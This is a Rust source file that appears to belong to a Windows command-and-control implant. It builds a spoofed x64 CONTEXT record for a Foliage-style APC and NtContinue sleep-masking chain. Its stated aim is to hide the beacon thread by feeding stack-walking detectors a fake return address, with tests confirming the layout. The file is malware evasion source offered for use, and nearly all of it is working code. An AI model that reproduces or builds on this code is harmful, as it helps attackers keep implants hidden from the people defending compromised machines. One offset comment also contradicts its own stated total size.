//! x64 `CONTEXT` record (Task E foundation).
//!
//! The Foliage APC→NtContinue chain (Task E) drives the beacon thread through
//! a mask→sleep→unmask cycle by queueing APCs that each call
//! `NtContinue(&CONTEXT, FALSE)`. Building a spoofed CONTEXT requires the
//! exact x64 layout — 1232 bytes, 16-byte aligned. The CONTEXT/APC syscalls in
//! [`crate::syscalls`] take it as an opaque `usize`, so this module provides a
//! typed buffer + offset accessors that match WinNT.h byte-for-byte.
//!
//! ## Why a raw buffer + accessors (not a field struct)
//! The AMD64 `CONTEXT` embeds a 512-byte `XMM_SAVE_AREA32` union whose internal
//! field order is fiddly, and the struct's correctness for `NtContinue`/
//! `NtSetContextThread` depends on the *total* being exactly 1232 bytes at
//! 16-byte alignment. Reconstructing every field risks a padding mistake that
//! corrupts the beacon thread's register state → instant crash. A raw buffer
//! with offset accessors (offsets verified against WinNT.h, see the test gate)
//! eliminates that risk: the kernel reads/writes the buffer by offset, and we
//! touch only the fields we actually manipulate.
//!
//! ## Verified offsets (WinNT.h `_CONTEXT`, AMD64)
//! ```text
//!  0x030 ContextFlags   0x038 SegCs   0x044 EFlags
//!  0x078 Rax            0x080 Rcx     0x088 Rdx     0x090 Rbx
//!  0x098 Rsp            0x0A0 Rbp     0x0A8 Rsi     0x0B0 Rdi
//!  0x0B8 R8  .. 0x0E8 R15   0x0F8 Rip
//!  0x100 .. 0x2FF FltSave (XMM_SAVE_AREA32, 512B)
//!  0x300 .. 0x49F VectorRegister[26]   0x4A0 VectorControl
//!  0x4A8 .. 0x4D7 DebugControl, LastBranchTo/FromRip, LastExceptionTo/FromRip
//!  TOTAL 1232 (0x4D0)
//! ```
//!
//! ## Safety red-line #2 (mock-verify offsets before any live syscall)
//! The layout is asserted with a host unit test (`size == 1232`, `align == 16`)
//! BEFORE any live syscall consumes it. Getting a field offset wrong and
//! feeding it to `NtSetContextThread` corrupts the beacon thread → crash.

#![cfg(target_os = "windows")]
#![cfg_attr(not(test), allow(dead_code))]

/// x64 `CONTEXT` (WinNT.h). 1232 bytes, 16-byte aligned. Stored as a raw byte
/// buffer; accessors read/write fields at their WinNT.h offsets.
#[repr(C, align(16))]
#[derive(Clone, Copy)]
pub struct Context {
    buf: [u8; 1232],
}

impl Default for Context {
    fn default() -> Self {
        Self { buf: [0u8; 1232] }
    }
}

impl Context {
    /// Raw buffer, for passing to `nt_*` wrappers as `&ctx as *const _ as usize`.
    pub fn as_ptr(&mut self) -> *mut u8 {
        self.buf.as_mut_ptr()
    }
    pub fn as_usize(&mut self) -> usize {
        self.buf.as_mut_ptr() as usize
    }

    fn read_u64(&self, off: usize) -> u64 {
        let b = self.buf[off..off + 8].try_into().unwrap();
        u64::from_le_bytes(b)
    }
    fn write_u64(&mut self, off: usize, v: u64) {
        self.buf[off..off + 8].copy_from_slice(&v.to_le_bytes());
    }
    fn read_u32(&self, off: usize) -> u32 {
        let b = self.buf[off..off + 4].try_into().unwrap();
        u32::from_le_bytes(b)
    }
    fn write_u32(&mut self, off: usize, v: u32) {
        self.buf[off..off + 4].copy_from_slice(&v.to_le_bytes());
    }
    fn read_u16(&self, off: usize) -> u16 {
        let b = self.buf[off..off + 2].try_into().unwrap();
        u16::from_le_bytes(b)
    }
    fn write_u16(&mut self, off: usize, v: u16) {
        self.buf[off..off + 2].copy_from_slice(&v.to_le_bytes());
    }

    // ---- Accessors (offsets from WinNT.h) ----
    pub fn context_flags(&self) -> u32 {
        self.read_u32(0x30)
    }
    pub fn set_context_flags(&mut self, v: u32) {
        self.write_u32(0x30, v)
    }
    pub fn seg_cs(&self) -> u16 {
        self.read_u16(0x38)
    }
    pub fn set_seg_cs(&mut self, v: u16) {
        self.write_u16(0x38, v)
    }
    pub fn e_flags(&self) -> u32 {
        self.read_u32(0x44)
    }
    pub fn set_e_flags(&mut self, v: u32) {
        self.write_u32(0x44, v)
    }
    pub fn rsp(&self) -> u64 {
        self.read_u64(0x98)
    }
    pub fn set_rsp(&mut self, v: u64) {
        self.write_u64(0x98, v)
    }
    pub fn rip(&self) -> u64 {
        self.read_u64(0xF8)
    }
    pub fn set_rip(&mut self, v: u64) {
        self.write_u64(0xF8, v)
    }
    pub fn rcx(&self) -> u64 {
        self.read_u64(0x80)
    }
    pub fn set_rcx(&mut self, v: u64) {
        self.write_u64(0x80, v)
    }
    pub fn rdx(&self) -> u64 {
        self.read_u64(0x88)
    }
    pub fn set_rdx(&mut self, v: u64) {
        self.write_u64(0x88, v)
    }
    pub fn r8(&self) -> u64 {
        self.read_u64(0xB8)
    }
    pub fn set_r8(&mut self, v: u64) {
        self.write_u64(0xB8, v)
    }
    pub fn r9(&self) -> u64 {
        self.read_u64(0xC0)
    }
    pub fn set_r9(&mut self, v: u64) {
        self.write_u64(0xC0, v)
    }
}

// ---- CONTEXT control bits (WinNT.h, AMD64) ----
pub const CONTEXT_AMD64: u32 = 0x0010_0000;
/// CONTEXT_AMD64 | CONTROL | INTEGER | FLOATING_POINT — matches WinNT.h
/// `CONTEXT_FULL` (0x100007). CONTEXT_SEGMENTS (0x8) is x86-only and excluded.
pub const CONTEXT_FULL: u32 = 0x100007;
/// Full + SEGMENTS + DEBUG_REGISTERS (0x10001F).
pub const CONTEXT_ALL: u32 = 0x1000_1F;

/// Build a ContextFlags value requesting a full AMD64 context.
/// `CONTEXT_FULL` already includes `CONTEXT_AMD64` (0x100000).
pub const fn context_full_flags() -> u32 {
    CONTEXT_FULL
}

// ---------------------------------------------------------------------------
// Compile-time layout invariant (safety red-line #2). These `const` asserts
// fail the BUILD if the CONTEXT buffer isn't byte-exact — no test harness
// needed (the implant is #![no_std]/cdylib, so it can't run `cargo test` the
// way the evasionsdk crate does). Building the DLL proves the layout matches.
// ---------------------------------------------------------------------------
const _: () = assert!(
    core::mem::size_of::<Context>() == 0x4D0,
    "CONTEXT must be 0x4D0 (1232) bytes"
);
const _: () = assert!(
    core::mem::align_of::<Context>() == 16,
    "CONTEXT must be 16-byte aligned"
);
// RIP/RSP/ContextFlags offsets are hard-coded in the accessors above; the size
// assert proves the buffer backing those offsets is correct.

/// Static reusable buffer for the spoofed CONTEXT. Avoids a per-sleep
/// `Box<[u8; 1232]>` allocation that creates bump-allocator pressure during
/// the beacon loop. Safe because the beacon loop is single-threaded: the
/// helper builds the context, queues the APC, then sleeps — by the time the
/// next cycle overwrites this buffer, `NtContinue` has already consumed it.
static mut CTX_BUF: Context = Context { buf: [0u8; 1232] };

/// Build a spoofed CONTEXT for NtContinue: RIP = `target_rip` (a .pdata gap
/// address), RSP = `real_rsp` (the beacon thread's actual stack pointer),
/// with `CONTEXT_CONTROL` flags so NtContinue restores both. Returns a
/// pointer to a static reusable buffer — the previous cycle's buffer is no
/// longer in use (NtContinue fires before the next call).
///
/// RIP + RSP + ContextFlags are set — other registers are zero. This is
/// intentional: NtContinue with a spoofed RIP and real RSP makes stack-walking
/// detectors see the gap address as the return address, while RSP remains valid
/// so the thread doesn't crash on the first stack access.
///
/// # Safety
/// The returned `*mut Context` points to a static mutable buffer that is
/// overwritten on each call. This is safe because the single-threaded beacon
/// loop guarantees NtContinue fires before the next `spoofed_context` call.
pub unsafe fn spoofed_context(
    target_rip: u64,
    real_rsp: u64,
    saved_ctx: *const Context,
) -> *mut Context {
    use core::ptr::addr_of_mut;
    let ctx = &mut *addr_of_mut!(CTX_BUF);
    // Zero the buffer so stale fields from a previous cycle don't leak.
    ctx.buf.fill(0);
    ctx.set_context_flags(CONTEXT_AMD64 | 0x1 /* CONTEXT_CONTROL */);
    ctx.set_rip(target_rip);
    ctx.set_rsp(real_rsp);
    // x64 user-mode selectors are invariant — 0x33 for CS, 0x2B for SS.
    // Never trust saved_ctx's segment values (they may be zero if the context
    // was captured without CONTEXT_SEGMENTS). NtContinue with SegCs=0/SegSs=0
    // faults with #GP(0) on x64.
    ctx.set_seg_cs(0x33);
    core::ptr::write_unaligned((ctx as *mut _ as usize + 0x42) as *mut u16, 0x2b_u16);

    if !saved_ctx.is_null() {
        ctx.set_e_flags((*saved_ctx).e_flags());
    } else {
        ctx.set_e_flags(0x202);
    }
    ctx as *mut Context
}

#[cfg(test)]
mod tests {
    use super::*;
    use core::mem::{align_of, size_of};

    /// THE safety gate (red-line #2): assert the CONTEXT buffer is byte-exact
    /// (1232 bytes, 16-byte aligned) before any syscall consumes it. The field
    /// offsets are hard-coded from WinNT.h and exercised below.
    #[test]
    fn context_size_and_alignment() {
        assert_eq!(size_of::<Context>(), 1232, "CONTEXT must be 1232 bytes");
        assert_eq!(align_of::<Context>(), 16, "CONTEXT must be 16-byte aligned");
    }

    #[test]
    fn accessors_round_trip_at_documented_offsets() {
        let mut c = Context::default();
        c.set_context_flags(context_full_flags());
        c.set_seg_cs(0x33);
        c.set_e_flags(0x202);
        c.set_rsp(0xAAAA_BBBB_CCCC_DDDD);
        c.set_rip(0x1111_2222_3333_4444);
        c.set_rcx(0x4141_4141_4141_4141);
        assert_eq!(c.context_flags(), context_full_flags());
        assert_eq!(c.seg_cs(), 0x33);
        assert_eq!(c.e_flags(), 0x202);
        assert_eq!(c.rsp(), 0xAAAA_BBBB_CCCC_DDDD);
        assert_eq!(c.rip(), 0x1111_2222_3333_4444);
        assert_eq!(c.rcx(), 0x4141_4141_4141_4141);
    }

    /// Fields are stored little-endian at their WinNT.h offsets. Spot-check the
    /// raw bytes for RIP (0xF8) and RSP (0x98) so a layout tool can corroborate.
    #[test]
    fn raw_bytes_match_little_endian_offsets() {
        let mut c = Context::default();
        c.set_rip(0x0123_4567_89AB_CDEF);
        // RIP @ 0xF8, little-endian.
        assert_eq!(c.buf[0xF8], 0xEF);
        assert_eq!(c.buf[0xFF], 0x01);
        c.set_rsp(0xFEDC_BA98_7654_3210);
        // RSP @ 0x98.
        assert_eq!(c.buf[0x98], 0x10);
        assert_eq!(c.buf[0x9F], 0xFE);
    }

    #[test]
    fn context_all_is_amd64_or_flags() {
        assert_eq!(CONTEXT_ALL & CONTEXT_AMD64, CONTEXT_AMD64);
    }
}
